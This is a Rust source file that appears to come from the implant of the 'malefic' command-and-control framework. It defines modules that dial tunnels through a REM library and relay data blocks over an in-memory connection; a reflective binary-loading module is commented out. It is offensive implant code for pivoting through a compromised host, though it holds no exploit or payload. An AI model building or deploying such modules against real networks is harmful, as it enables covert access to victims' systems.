use crate::prelude::*;
use async_trait::async_trait;
use futures::SinkExt;
use malefic_proto::proto::modulepb::{Block, Request, Response};
use malefic_rem as rem;

// #[cfg(feature = "load_rem")]
// pub struct LoadRem {}
//
// #[cfg(feature = "load_rem")]
// #[async_trait]
// #[module_impl("load_rem")]
// impl Module for LoadRem {}
//
// #[cfg(feature = "load_rem")]
// #[async_trait]
// impl ModuleImpl for LoadRem {
//     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
//         let request = check_request!(receiver, Body::Request)?;
//         let bin = check_field!(request.bin)?;
//         to_error!(rem::RemReflection::load_rem(bin))?;
//
//         Ok(TaskResult::new_with_body(
//             id,
//             Body::Response(Response::default()),
//         ))
//     }
// }

#[cfg(feature = "rem_dial")]
pub struct RemDial {}

#[cfg(feature = "rem_dial")]
#[async_trait]
#[module_impl("rem_dial")]
impl Module for RemDial {}

#[cfg(feature = "rem_dial")]
#[async_trait]
impl ModuleImpl for RemDial {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;
        let args = check_field!(request.args)?;
        let cmdline = args.join(" ");
        let agent_id = to_error!(rem::rem_dial(&cmdline))?;
        let mut resp = Response::default();
        resp.output = agent_id;
        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

#[cfg(feature = "memory_dial")]
pub struct MemoryDial {}

#[cfg(feature = "memory_dial")]
#[async_trait]
#[module_impl("memory_dial")]
impl Module for MemoryDial {}

#[cfg(feature = "memory_dial")]
#[async_trait]
impl ModuleImpl for MemoryDial {
    async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;
        let Request { args, .. } = request;

        if args.len() != 2 {
            return Err(anyhow!("Need two arguments: memhandle and dst"));
        }
        let memhandle = &args[0];
        let dst = &args[1];

        // Establish connection
        let handle = match rem::memory_dial(memhandle, dst) {
            Ok(h) => h,
            Err(e) => return Err(anyhow!(e)),
        };

        // Send connection success response
        let response = Response {
            output: handle.to_string(),
            error: String::new(),
            kv: Default::default(),
            array: vec![],
        };
        let _ = sender
            .send(TaskResult::new_with_body(id, Body::Response(response)))
            .await?;

        let mut buffer = vec![0u8; 4096]; // Default buffer size
        let mut seq = 0;

        loop {
            // Wait for command
            let cmd = check_request!(receiver, Body::Block)?;

            if cmd.content.is_empty() {
                // If content is empty, need to read data
                match rem::memory_read(handle, &mut buffer) {
                    Ok(n) => {
                        let block = Block {
                            block_id: seq,
                            content: buffer[..n].to_vec(),
                            end: n < buffer.len(), // If bytes read is less than buffer size, reading is complete
                        };
                        let _ = sender
                            .send(TaskResult::new_with_body(id, Body::Block(block)))
                            .await?;
                    }
                    Err(e) => {
                        let _ = rem::memory_close(handle);
                        return Err(anyhow!(e));
                    }
                }
            } else {
                // If content is not empty, need to write data
                match rem::memory_write(handle, &cmd.content) {
                    Ok(_) => {
                        let _ = sender
                            .send(TaskResult::new_with_ack(id, cmd.block_id))
                            .await?;
                    }
                    Err(e) => {
                        let _ = rem::memory_close(handle);
                        return Err(anyhow!(e));
                    }
                }
            }

            if cmd.end {
                let _ = rem::memory_close(handle);
                return Ok(TaskResult::new_with_ack(id, cmd.block_id));
            }
            seq += 1;
        }
    }
}
